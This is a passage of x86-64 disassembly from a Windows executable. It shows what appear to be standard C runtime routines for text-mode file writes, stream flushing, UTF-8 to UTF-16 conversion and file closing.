   14000be25:	0f 83 1d 01 00 00    	jae    0x14000bf48
   14000be2b:	8b 75 d4             	mov    -0x2c(%rbp),%esi
   14000be2e:	41 0f b7 07          	movzwl (%r15),%eax
   14000be32:	0f b7 c8             	movzwl %ax,%ecx
   14000be35:	66 89 45 f0          	mov    %ax,-0x10(%rbp)
   14000be39:	e8 aa 05 00 00       	call   0x14000c3e8
   14000be3e:	0f b7 4d f0          	movzwl -0x10(%rbp),%ecx
   14000be42:	66 3b c1             	cmp    %cx,%ax
   14000be45:	75 36                	jne    0x14000be7d
   14000be47:	83 c6 02             	add    $0x2,%esi
   14000be4a:	89 75 d4             	mov    %esi,-0x2c(%rbp)
   14000be4d:	66 83 f9 0a          	cmp    $0xa,%cx
   14000be51:	75 1b                	jne    0x14000be6e
   14000be53:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000be58:	e8 8b 05 00 00       	call   0x14000c3e8
   14000be5d:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000be62:	66 3b c1             	cmp    %cx,%ax
   14000be65:	75 16                	jne    0x14000be7d
   14000be67:	ff c6                	inc    %esi
   14000be69:	89 75 d4             	mov    %esi,-0x2c(%rbp)
   14000be6c:	ff c7                	inc    %edi
   14000be6e:	49 83 c7 02          	add    $0x2,%r15
   14000be72:	4d 3b fc             	cmp    %r12,%r15
   14000be75:	0f 83 cd 00 00 00    	jae    0x14000bf48
   14000be7b:	eb b1                	jmp    0x14000be2e
   14000be7d:	ff 15 0d 32 00 00    	call   *0x320d(%rip)        # 0x14000f090
   14000be83:	89 45 d0             	mov    %eax,-0x30(%rbp)
   14000be86:	e9 bd 00 00 00       	jmp    0x14000bf48
   14000be8b:	45 8b cf             	mov    %r15d,%r9d
   14000be8e:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000be93:	4d 8b c6             	mov    %r14,%r8
   14000be96:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000be9a:	41 8b d4             	mov    %r12d,%edx
   14000be9d:	e8 ea f4 ff ff       	call   0x14000b38c
   14000bea2:	f2 0f 10 00          	movsd  (%rax),%xmm0
   14000bea6:	8b 78 08             	mov    0x8(%rax),%edi
   14000bea9:	e9 9f 00 00 00       	jmp    0x14000bf4d
   14000beae:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
   14000beb2:	4c 8d 05 27 e3 00 00 	lea    0xe327(%rip),%r8        # 0x14001a1e0
   14000beb9:	49 8b 0c d0          	mov    (%r8,%rdx,8),%rcx
   14000bebd:	42 38 7c e9 38       	cmp    %dil,0x38(%rcx,%r13,8)
   14000bec2:	7d 51                	jge    0x14000bf15
   14000bec4:	8b ce                	mov    %esi,%ecx
   14000bec6:	40 84 f6             	test   %sil,%sil
   14000bec9:	74 36                	je     0x14000bf01
   14000becb:	83 e9 01             	sub    $0x1,%ecx
   14000bece:	74 1d                	je     0x14000beed
   14000bed0:	83 f9 01             	cmp    $0x1,%ecx
   14000bed3:	0f 85 84 00 00 00    	jne    0x14000bf5d
   14000bed9:	45 8b cf             	mov    %r15d,%r9d
   14000bedc:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000bee0:	4d 8b c6             	mov    %r14,%r8
   14000bee3:	41 8b d4             	mov    %r12d,%edx
   14000bee6:	e8 31 fa ff ff       	call   0x14000b91c
   14000beeb:	eb b5                	jmp    0x14000bea2
   14000beed:	45 8b cf             	mov    %r15d,%r9d
   14000bef0:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000bef4:	4d 8b c6             	mov    %r14,%r8
   14000bef7:	41 8b d4             	mov    %r12d,%edx
   14000befa:	e8 39 fb ff ff       	call   0x14000ba38
   14000beff:	eb a1                	jmp    0x14000bea2
   14000bf01:	45 8b cf             	mov    %r15d,%r9d
   14000bf04:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000bf08:	4d 8b c6             	mov    %r14,%r8
   14000bf0b:	41 8b d4             	mov    %r12d,%edx
   14000bf0e:	e8 05 f9 ff ff       	call   0x14000b818
   14000bf13:	eb 8d                	jmp    0x14000bea2
   14000bf15:	4a 8b 4c e9 28       	mov    0x28(%rcx,%r13,8),%rcx
   14000bf1a:	4c 8d 4d d4          	lea    -0x2c(%rbp),%r9
   14000bf1e:	33 c0                	xor    %eax,%eax
   14000bf20:	45 8b c7             	mov    %r15d,%r8d
   14000bf23:	48 21 44 24 20       	and    %rax,0x20(%rsp)
   14000bf28:	49 8b d6             	mov    %r14,%rdx
   14000bf2b:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   14000bf2f:	89 45 d8             	mov    %eax,-0x28(%rbp)
   14000bf32:	ff 15 e0 31 00 00    	call   *0x31e0(%rip)        # 0x14000f118
   14000bf38:	85 c0                	test   %eax,%eax
   14000bf3a:	75 09                	jne    0x14000bf45
   14000bf3c:	ff 15 4e 31 00 00    	call   *0x314e(%rip)        # 0x14000f090
   14000bf42:	89 45 d0             	mov    %eax,-0x30(%rbp)
   14000bf45:	8b 7d d8             	mov    -0x28(%rbp),%edi
   14000bf48:	f2 0f 10 45 d0       	movsd  -0x30(%rbp),%xmm0
   14000bf4d:	f2 0f 11 45 e0       	movsd  %xmm0,-0x20(%rbp)
   14000bf52:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
   14000bf56:	4c 8d 05 83 e2 00 00 	lea    0xe283(%rip),%r8        # 0x14001a1e0
   14000bf5d:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   14000bf61:	48 c1 e8 20          	shr    $0x20,%rax
   14000bf65:	85 c0                	test   %eax,%eax
   14000bf67:	75 5d                	jne    0x14000bfc6
   14000bf69:	8b 45 e0             	mov    -0x20(%rbp),%eax
   14000bf6c:	85 c0                	test   %eax,%eax
   14000bf6e:	74 2c                	je     0x14000bf9c
   14000bf70:	83 f8 05             	cmp    $0x5,%eax
   14000bf73:	75 17                	jne    0x14000bf8c
   14000bf75:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   14000bf79:	c7 43 2c 09 00 00 00 	movl   $0x9,0x2c(%rbx)
   14000bf80:	c6 43 38 01          	movb   $0x1,0x38(%rbx)
   14000bf84:	89 43 34             	mov    %eax,0x34(%rbx)
   14000bf87:	e9 a3 fd ff ff       	jmp    0x14000bd2f
   14000bf8c:	8b 4d e0             	mov    -0x20(%rbp),%ecx
   14000bf8f:	48 8b d3             	mov    %rbx,%rdx
   14000bf92:	e8 79 b4 ff ff       	call   0x140007410
   14000bf97:	e9 93 fd ff ff       	jmp    0x14000bd2f
   14000bf9c:	49 8b 04 d0          	mov    (%r8,%rdx,8),%rax
   14000bfa0:	42 f6 44 e8 38 40    	testb  $0x40,0x38(%rax,%r13,8)
   14000bfa6:	74 06                	je     0x14000bfae
   14000bfa8:	41 80 3e 1a          	cmpb   $0x1a,(%r14)
   14000bfac:	74 1f                	je     0x14000bfcd
   14000bfae:	83 63 34 00          	andl   $0x0,0x34(%rbx)
   14000bfb2:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   14000bfb6:	c7 43 2c 1c 00 00 00 	movl   $0x1c,0x2c(%rbx)
   14000bfbd:	c6 43 38 01          	movb   $0x1,0x38(%rbx)
   14000bfc1:	e9 69 fd ff ff       	jmp    0x14000bd2f
   14000bfc6:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   14000bfc9:	2b c7                	sub    %edi,%eax
   14000bfcb:	eb 02                	jmp    0x14000bfcf
   14000bfcd:	33 c0                	xor    %eax,%eax
   14000bfcf:	48 83 c4 68          	add    $0x68,%rsp
   14000bfd3:	41 5f                	pop    %r15
   14000bfd5:	41 5e                	pop    %r14
   14000bfd7:	41 5d                	pop    %r13
   14000bfd9:	41 5c                	pop    %r12
   14000bfdb:	5f                   	pop    %rdi
   14000bfdc:	5e                   	pop    %rsi
   14000bfdd:	5b                   	pop    %rbx
   14000bfde:	5d                   	pop    %rbp
   14000bfdf:	c3                   	ret
   14000bfe0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000bfe5:	57                   	push   %rdi
   14000bfe6:	48 83 ec 30          	sub    $0x30,%rsp
   14000bfea:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   14000bfef:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000bff4:	e8 af c8 ff ff       	call   0x1400088a8
   14000bff9:	90                   	nop
   14000bffa:	bb 03 00 00 00       	mov    $0x3,%ebx
   14000bfff:	89 5c 24 24          	mov    %ebx,0x24(%rsp)
   14000c003:	3b 1d af e7 00 00    	cmp    0xe7af(%rip),%ebx        # 0x14001a7b8
   14000c009:	74 6d                	je     0x14000c078
   14000c00b:	48 63 fb             	movslq %ebx,%rdi
   14000c00e:	48 8b 05 ab e7 00 00 	mov    0xe7ab(%rip),%rax        # 0x14001a7c0
   14000c015:	48 8b 0c f8          	mov    (%rax,%rdi,8),%rcx
   14000c019:	48 85 c9             	test   %rcx,%rcx
   14000c01c:	75 02                	jne    0x14000c020
   14000c01e:	eb 54                	jmp    0x14000c074
   14000c020:	8b 41 14             	mov    0x14(%rcx),%eax
   14000c023:	c1 e8 0d             	shr    $0xd,%eax
   14000c026:	24 01                	and    $0x1,%al
   14000c028:	74 19                	je     0x14000c043
   14000c02a:	48 8b 0d 8f e7 00 00 	mov    0xe78f(%rip),%rcx        # 0x14001a7c0
   14000c031:	48 8b 0c f9          	mov    (%rcx,%rdi,8),%rcx
   14000c035:	e8 0a 05 00 00       	call   0x14000c544
   14000c03a:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000c03d:	74 04                	je     0x14000c043
   14000c03f:	ff 44 24 20          	incl   0x20(%rsp)
   14000c043:	48 8b 05 76 e7 00 00 	mov    0xe776(%rip),%rax        # 0x14001a7c0
   14000c04a:	48 8b 0c f8          	mov    (%rax,%rdi,8),%rcx
   14000c04e:	48 83 c1 30          	add    $0x30,%rcx
   14000c052:	ff 15 58 30 00 00    	call   *0x3058(%rip)        # 0x14000f0b0
   14000c058:	48 8b 0d 61 e7 00 00 	mov    0xe761(%rip),%rcx        # 0x14001a7c0
   14000c05f:	48 8b 0c f9          	mov    (%rcx,%rdi,8),%rcx
   14000c063:	e8 84 b4 ff ff       	call   0x1400074ec
   14000c068:	48 8b 05 51 e7 00 00 	mov    0xe751(%rip),%rax        # 0x14001a7c0
   14000c06f:	48 83 24 f8 00       	andq   $0x0,(%rax,%rdi,8)
   14000c074:	ff c3                	inc    %ebx
   14000c076:	eb 87                	jmp    0x14000bfff
   14000c078:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000c07d:	e8 7a c8 ff ff       	call   0x1400088fc
   14000c082:	8b 44 24 20          	mov    0x20(%rsp),%eax
   14000c086:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   14000c08b:	48 83 c4 30          	add    $0x30,%rsp
   14000c08f:	5f                   	pop    %rdi
   14000c090:	c3                   	ret
   14000c091:	cc                   	int3
   14000c092:	cc                   	int3
   14000c093:	cc                   	int3
   14000c094:	40 53                	rex push %rbx
   14000c096:	48 83 ec 20          	sub    $0x20,%rsp
   14000c09a:	8b 41 14             	mov    0x14(%rcx),%eax
   14000c09d:	48 8b d9             	mov    %rcx,%rbx
   14000c0a0:	c1 e8 0d             	shr    $0xd,%eax
   14000c0a3:	a8 01                	test   $0x1,%al
   14000c0a5:	74 27                	je     0x14000c0ce
   14000c0a7:	8b 41 14             	mov    0x14(%rcx),%eax
   14000c0aa:	c1 e8 06             	shr    $0x6,%eax
   14000c0ad:	a8 01                	test   $0x1,%al
   14000c0af:	74 1d                	je     0x14000c0ce
   14000c0b1:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   14000c0b5:	e8 32 b4 ff ff       	call   0x1400074ec
   14000c0ba:	f0 81 63 14 bf fe ff 	lock andl $0xfffffebf,0x14(%rbx)
   14000c0c1:	ff 
   14000c0c2:	33 c0                	xor    %eax,%eax
   14000c0c4:	48 89 43 08          	mov    %rax,0x8(%rbx)
   14000c0c8:	48 89 03             	mov    %rax,(%rbx)
   14000c0cb:	89 43 10             	mov    %eax,0x10(%rbx)
   14000c0ce:	48 83 c4 20          	add    $0x20,%rsp
   14000c0d2:	5b                   	pop    %rbx
   14000c0d3:	c3                   	ret
   14000c0d4:	48 83 ec 28          	sub    $0x28,%rsp
   14000c0d8:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   14000c0db:	75 0d                	jne    0x14000c0ea
   14000c0dd:	e8 72 b3 ff ff       	call   0x140007454
   14000c0e2:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000c0e8:	eb 42                	jmp    0x14000c12c
   14000c0ea:	85 c9                	test   %ecx,%ecx
   14000c0ec:	78 2e                	js     0x14000c11c
   14000c0ee:	3b 0d ec e4 00 00    	cmp    0xe4ec(%rip),%ecx        # 0x14001a5e0
   14000c0f4:	73 26                	jae    0x14000c11c
   14000c0f6:	48 63 c9             	movslq %ecx,%rcx
   14000c0f9:	48 8d 15 e0 e0 00 00 	lea    0xe0e0(%rip),%rdx        # 0x14001a1e0
   14000c100:	48 8b c1             	mov    %rcx,%rax
   14000c103:	83 e1 3f             	and    $0x3f,%ecx
   14000c106:	48 c1 e8 06          	shr    $0x6,%rax
   14000c10a:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   14000c10e:	48 8b 04 c2          	mov    (%rdx,%rax,8),%rax
   14000c112:	0f b6 44 c8 38       	movzbl 0x38(%rax,%rcx,8),%eax
   14000c117:	83 e0 40             	and    $0x40,%eax
   14000c11a:	eb 12                	jmp    0x14000c12e
   14000c11c:	e8 33 b3 ff ff       	call   0x140007454
   14000c121:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000c127:	e8 d0 b0 ff ff       	call   0x1400071fc
   14000c12c:	33 c0                	xor    %eax,%eax
   14000c12e:	48 83 c4 28          	add    $0x28,%rsp
   14000c132:	c3                   	ret
   14000c133:	cc                   	int3
   14000c134:	40 53                	rex push %rbx
   14000c136:	48 83 ec 40          	sub    $0x40,%rsp
   14000c13a:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000c13f:	48 8b d9             	mov    %rcx,%rbx
   14000c142:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000c147:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000c14c:	e8 57 0a 00 00       	call   0x14000cba8
   14000c151:	48 83 f8 04          	cmp    $0x4,%rax
   14000c155:	77 1a                	ja     0x14000c171
   14000c157:	8b 54 24 30          	mov    0x30(%rsp),%edx
   14000c15b:	b9 fd ff 00 00       	mov    $0xfffd,%ecx
   14000c160:	81 fa ff ff 00 00    	cmp    $0xffff,%edx
   14000c166:	0f 47 d1             	cmova  %ecx,%edx
   14000c169:	48 85 db             	test   %rbx,%rbx
   14000c16c:	74 03                	je     0x14000c171
   14000c16e:	66 89 13             	mov    %dx,(%rbx)
   14000c171:	48 83 c4 40          	add    $0x40,%rsp
   14000c175:	5b                   	pop    %rbx
   14000c176:	c3                   	ret
   14000c177:	cc                   	int3
   14000c178:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000c17d:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000c182:	57                   	push   %rdi
   14000c183:	41 54                	push   %r12
   14000c185:	41 55                	push   %r13
   14000c187:	41 56                	push   %r14
   14000c189:	41 57                	push   %r15
   14000c18b:	48 83 ec 30          	sub    $0x30,%rsp
   14000c18f:	48 8b 3a             	mov    (%rdx),%rdi
   14000c192:	33 c0                	xor    %eax,%eax
   14000c194:	4d 8b e1             	mov    %r9,%r12
   14000c197:	49 8b e8             	mov    %r8,%rbp
   14000c19a:	4c 8b fa             	mov    %rdx,%r15
   14000c19d:	4c 8b f1             	mov    %rcx,%r14
   14000c1a0:	48 85 c9             	test   %rcx,%rcx
   14000c1a3:	0f 84 e7 00 00 00    	je     0x14000c290
   14000c1a9:	48 8b d9             	mov    %rcx,%rbx
   14000c1ac:	4d 85 c0             	test   %r8,%r8
   14000c1af:	0f 84 b0 00 00 00    	je     0x14000c265
   14000c1b5:	4c 8b ac 24 80 00 00 	mov    0x80(%rsp),%r13
   14000c1bc:	00 
   14000c1bd:	38 07                	cmp    %al,(%rdi)
   14000c1bf:	75 08                	jne    0x14000c1c9
   14000c1c1:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000c1c7:	eb 1c                	jmp    0x14000c1e5
   14000c1c9:	38 47 01             	cmp    %al,0x1(%rdi)
   14000c1cc:	75 08                	jne    0x14000c1d6
   14000c1ce:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000c1d4:	eb 0f                	jmp    0x14000c1e5
   14000c1d6:	8a 47 02             	mov    0x2(%rdi),%al
   14000c1d9:	f6 d8                	neg    %al
   14000c1db:	4d 1b c0             	sbb    %r8,%r8
   14000c1de:	49 f7 d8             	neg    %r8
   14000c1e1:	49 83 c0 03          	add    $0x3,%r8
   14000c1e5:	4d 8b cc             	mov    %r12,%r9
   14000c1e8:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   14000c1ed:	48 8b d7             	mov    %rdi,%rdx
   14000c1f0:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000c1f5:	e8 ae 09 00 00       	call   0x14000cba8
   14000c1fa:	48 8b d0             	mov    %rax,%rdx
   14000c1fd:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000c201:	74 7b                	je     0x14000c27e
   14000c203:	33 c0                	xor    %eax,%eax
   14000c205:	48 85 d2             	test   %rdx,%rdx
   14000c208:	74 6c                	je     0x14000c276
   14000c20a:	8b 4c 24 60          	mov    0x60(%rsp),%ecx
   14000c20e:	81 f9 ff ff 00 00    	cmp    $0xffff,%ecx
   14000c214:	76 3b                	jbe    0x14000c251
   14000c216:	48 83 fd 01          	cmp    $0x1,%rbp
   14000c21a:	76 49                	jbe    0x14000c265
   14000c21c:	81 c1 00 00 ff ff    	add    $0xffff0000,%ecx
   14000c222:	41 b8 00 d8 00 00    	mov    $0xd800,%r8d
   14000c228:	8b c1                	mov    %ecx,%eax
   14000c22a:	89 4c 24 60          	mov    %ecx,0x60(%rsp)
   14000c22e:	c1 e8 0a             	shr    $0xa,%eax
   14000c231:	48 ff cd             	dec    %rbp
   14000c234:	66 41 0b c0          	or     %r8w,%ax
   14000c238:	66 89 03             	mov    %ax,(%rbx)
   14000c23b:	b8 ff 03 00 00       	mov    $0x3ff,%eax
   14000c240:	66 23 c8             	and    %ax,%cx
   14000c243:	48 83 c3 02          	add    $0x2,%rbx
   14000c247:	b8 00 dc 00 00       	mov    $0xdc00,%eax
   14000c24c:	66 0b c8             	or     %ax,%cx
   14000c24f:	33 c0                	xor    %eax,%eax
   14000c251:	66 89 0b             	mov    %cx,(%rbx)
   14000c254:	48 03 fa             	add    %rdx,%rdi
   14000c257:	48 83 c3 02          	add    $0x2,%rbx
   14000c25b:	48 83 ed 01          	sub    $0x1,%rbp
   14000c25f:	0f 85 58 ff ff ff    	jne    0x14000c1bd
   14000c265:	49 2b de             	sub    %r14,%rbx
   14000c268:	49 89 3f             	mov    %rdi,(%r15)
   14000c26b:	48 d1 fb             	sar    $1,%rbx
   14000c26e:	48 8b c3             	mov    %rbx,%rax
   14000c271:	e9 8c 00 00 00       	jmp    0x14000c302
   14000c276:	48 8b f8             	mov    %rax,%rdi
   14000c279:	66 89 03             	mov    %ax,(%rbx)
   14000c27c:	eb e7                	jmp    0x14000c265
   14000c27e:	49 89 3f             	mov    %rdi,(%r15)
   14000c281:	41 c6 45 30 01       	movb   $0x1,0x30(%r13)
   14000c286:	41 c7 45 2c 2a 00 00 	movl   $0x2a,0x2c(%r13)
   14000c28d:	00 
   14000c28e:	eb 6e                	jmp    0x14000c2fe
   14000c290:	48 8b ac 24 80 00 00 	mov    0x80(%rsp),%rbp
   14000c297:	00 
   14000c298:	48 8b d8             	mov    %rax,%rbx
   14000c29b:	38 07                	cmp    %al,(%rdi)
   14000c29d:	75 08                	jne    0x14000c2a7
   14000c29f:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000c2a5:	eb 1c                	jmp    0x14000c2c3
   14000c2a7:	38 47 01             	cmp    %al,0x1(%rdi)
   14000c2aa:	75 08                	jne    0x14000c2b4
   14000c2ac:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000c2b2:	eb 0f                	jmp    0x14000c2c3
   14000c2b4:	8a 47 02             	mov    0x2(%rdi),%al
   14000c2b7:	f6 d8                	neg    %al
   14000c2b9:	4d 1b c0             	sbb    %r8,%r8
   14000c2bc:	49 f7 d8             	neg    %r8
   14000c2bf:	49 83 c0 03          	add    $0x3,%r8
   14000c2c3:	4d 8b cc             	mov    %r12,%r9
   14000c2c6:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   14000c2cb:	48 8b d7             	mov    %rdi,%rdx
   14000c2ce:	33 c9                	xor    %ecx,%ecx
   14000c2d0:	e8 d3 08 00 00       	call   0x14000cba8
   14000c2d5:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000c2d9:	74 18                	je     0x14000c2f3
   14000c2db:	48 85 c0             	test   %rax,%rax
   14000c2de:	74 8e                	je     0x14000c26e
   14000c2e0:	48 83 f8 04          	cmp    $0x4,%rax
   14000c2e4:	75 03                	jne    0x14000c2e9
   14000c2e6:	48 ff c3             	inc    %rbx
   14000c2e9:	48 03 f8             	add    %rax,%rdi
   14000c2ec:	48 ff c3             	inc    %rbx
   14000c2ef:	33 c0                	xor    %eax,%eax
   14000c2f1:	eb a8                	jmp    0x14000c29b
   14000c2f3:	c6 45 30 01          	movb   $0x1,0x30(%rbp)
   14000c2f7:	c7 45 2c 2a 00 00 00 	movl   $0x2a,0x2c(%rbp)
   14000c2fe:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000c302:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   14000c307:	48 8b 6c 24 70       	mov    0x70(%rsp),%rbp
   14000c30c:	48 83 c4 30          	add    $0x30,%rsp
   14000c310:	41 5f                	pop    %r15
   14000c312:	41 5e                	pop    %r14
   14000c314:	41 5d                	pop    %r13
   14000c316:	41 5c                	pop    %r12
   14000c318:	5f                   	pop    %rdi
   14000c319:	c3                   	ret
   14000c31a:	cc                   	int3
   14000c31b:	cc                   	int3
   14000c31c:	33 c0                	xor    %eax,%eax
   14000c31e:	38 01                	cmp    %al,(%rcx)
   14000c320:	74 0e                	je     0x14000c330
   14000c322:	48 3b c2             	cmp    %rdx,%rax
   14000c325:	74 09                	je     0x14000c330
   14000c327:	48 ff c0             	inc    %rax
   14000c32a:	80 3c 08 00          	cmpb   $0x0,(%rax,%rcx,1)
   14000c32e:	75 f2                	jne    0x14000c322
   14000c330:	c3                   	ret
   14000c331:	cc                   	int3
   14000c332:	cc                   	int3
   14000c333:	cc                   	int3
   14000c334:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000c339:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000c33e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000c343:	57                   	push   %rdi
   14000c344:	48 83 ec 30          	sub    $0x30,%rsp
   14000c348:	48 63 f9             	movslq %ecx,%rdi
   14000c34b:	49 8b d9             	mov    %r9,%rbx
   14000c34e:	8b cf                	mov    %edi,%ecx
   14000c350:	41 8b f0             	mov    %r8d,%esi
   14000c353:	48 8b ea             	mov    %rdx,%rbp
   14000c356:	e8 a5 c8 ff ff       	call   0x140008c00
   14000c35b:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000c35f:	75 11                	jne    0x14000c372
   14000c361:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   14000c365:	c7 43 2c 09 00 00 00 	movl   $0x9,0x2c(%rbx)
   14000c36c:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000c370:	eb 56                	jmp    0x14000c3c8
   14000c372:	44 8b ce             	mov    %esi,%r9d
   14000c375:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   14000c37a:	48 8b d5             	mov    %rbp,%rdx
   14000c37d:	48 8b c8             	mov    %rax,%rcx
   14000c380:	ff 15 a2 2e 00 00    	call   *0x2ea2(%rip)        # 0x14000f228
   14000c386:	85 c0                	test   %eax,%eax
   14000c388:	75 12                	jne    0x14000c39c
   14000c38a:	ff 15 00 2d 00 00    	call   *0x2d00(%rip)        # 0x14000f090
   14000c390:	8b c8                	mov    %eax,%ecx
   14000c392:	48 8b d3             	mov    %rbx,%rdx
   14000c395:	e8 76 b0 ff ff       	call   0x140007410
   14000c39a:	eb d0                	jmp    0x14000c36c
   14000c39c:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000c3a1:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000c3a5:	74 c5                	je     0x14000c36c
   14000c3a7:	48 8b d7             	mov    %rdi,%rdx
   14000c3aa:	4c 8d 05 2f de 00 00 	lea    0xde2f(%rip),%r8        # 0x14001a1e0
   14000c3b1:	83 e2 3f             	and    $0x3f,%edx
   14000c3b4:	48 8b cf             	mov    %rdi,%rcx
   14000c3b7:	48 c1 f9 06          	sar    $0x6,%rcx
   14000c3bb:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   14000c3bf:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   14000c3c3:	80 64 d1 38 fd       	andb   $0xfd,0x38(%rcx,%rdx,8)
   14000c3c8:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000c3cd:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   14000c3d2:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000c3d7:	48 83 c4 30          	add    $0x30,%rsp
   14000c3db:	5f                   	pop    %rdi
   14000c3dc:	c3                   	ret
   14000c3dd:	cc                   	int3
   14000c3de:	cc                   	int3
   14000c3df:	cc                   	int3
   14000c3e0:	e9 4f ff ff ff       	jmp    0x14000c334
   14000c3e5:	cc                   	int3
   14000c3e6:	cc                   	int3
   14000c3e7:	cc                   	int3
   14000c3e8:	66 89 4c 24 08       	mov    %cx,0x8(%rsp)
   14000c3ed:	48 83 ec 28          	sub    $0x28,%rsp
   14000c3f1:	e8 8e 09 00 00       	call   0x14000cd84
   14000c3f6:	85 c0                	test   %eax,%eax
   14000c3f8:	74 1f                	je     0x14000c419
   14000c3fa:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   14000c3ff:	ba 01 00 00 00       	mov    $0x1,%edx
   14000c404:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000c409:	e8 e6 09 00 00       	call   0x14000cdf4
   14000c40e:	85 c0                	test   %eax,%eax
   14000c410:	74 07                	je     0x14000c419
   14000c412:	0f b7 44 24 30       	movzwl 0x30(%rsp),%eax
   14000c417:	eb 05                	jmp    0x14000c41e
   14000c419:	b8 ff ff 00 00       	mov    $0xffff,%eax
   14000c41e:	48 83 c4 28          	add    $0x28,%rsp
   14000c422:	c3                   	ret
   14000c423:	cc                   	int3
   14000c424:	48 8b c4             	mov    %rsp,%rax
   14000c427:	48 89 58 10          	mov    %rbx,0x10(%rax)
   14000c42b:	48 89 48 08          	mov    %rcx,0x8(%rax)
   14000c42f:	57                   	push   %rdi
   14000c430:	48 83 ec 30          	sub    $0x30,%rsp
   14000c434:	48 8b fa             	mov    %rdx,%rdi
   14000c437:	48 8b d9             	mov    %rcx,%rbx
   14000c43a:	48 85 c9             	test   %rcx,%rcx
   14000c43d:	75 2e                	jne    0x14000c46d
   14000c43f:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   14000c443:	c7 42 2c 16 00 00 00 	movl   $0x16,0x2c(%rdx)
   14000c44a:	48 89 50 f0          	mov    %rdx,-0x10(%rax)
   14000c44e:	48 21 48 e8          	and    %rcx,-0x18(%rax)
   14000c452:	45 33 c9             	xor    %r9d,%r9d
   14000c455:	45 33 c0             	xor    %r8d,%r8d
   14000c458:	33 d2                	xor    %edx,%edx
   14000c45a:	e8 cd ac ff ff       	call   0x14000712c
   14000c45f:	83 c8 ff             	or     $0xffffffff,%eax
   14000c462:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   14000c467:	48 83 c4 30          	add    $0x30,%rsp
   14000c46b:	5f                   	pop    %rdi
   14000c46c:	c3                   	ret
   14000c46d:	8b 41 14             	mov    0x14(%rcx),%eax
   14000c470:	c1 e8 0c             	shr    $0xc,%eax
   14000c473:	24 01                	and    $0x1,%al
   14000c475:	74 07                	je     0x14000c47e
   14000c477:	e8 44 0c 00 00       	call   0x14000d0c0
   14000c47c:	eb e1                	jmp    0x14000c45f
   14000c47e:	e8 cd e1 ff ff       	call   0x14000a650
   14000c483:	90                   	nop
   14000c484:	48 8b d7             	mov    %rdi,%rdx
   14000c487:	48 8b cb             	mov    %rbx,%rcx
   14000c48a:	e8 11 00 00 00       	call   0x14000c4a0
   14000c48f:	8b f8                	mov    %eax,%edi
   14000c491:	48 8b cb             	mov    %rbx,%rcx
   14000c494:	e8 c3 e1 ff ff       	call   0x14000a65c
   14000c499:	8b c7                	mov    %edi,%eax
   14000c49b:	eb c5                	jmp    0x14000c462
   14000c49d:	cc                   	int3
   14000c49e:	cc                   	int3
   14000c49f:	cc                   	int3
   14000c4a0:	48 8b c4             	mov    %rsp,%rax
   14000c4a3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000c4a7:	48 89 70 10          	mov    %rsi,0x10(%rax)
   14000c4ab:	57                   	push   %rdi
   14000c4ac:	48 83 ec 30          	sub    $0x30,%rsp
   14000c4b0:	48 8b fa             	mov    %rdx,%rdi
   14000c4b3:	48 8b d9             	mov    %rcx,%rbx
   14000c4b6:	48 85 c9             	test   %rcx,%rcx
   14000c4b9:	75 25                	jne    0x14000c4e0
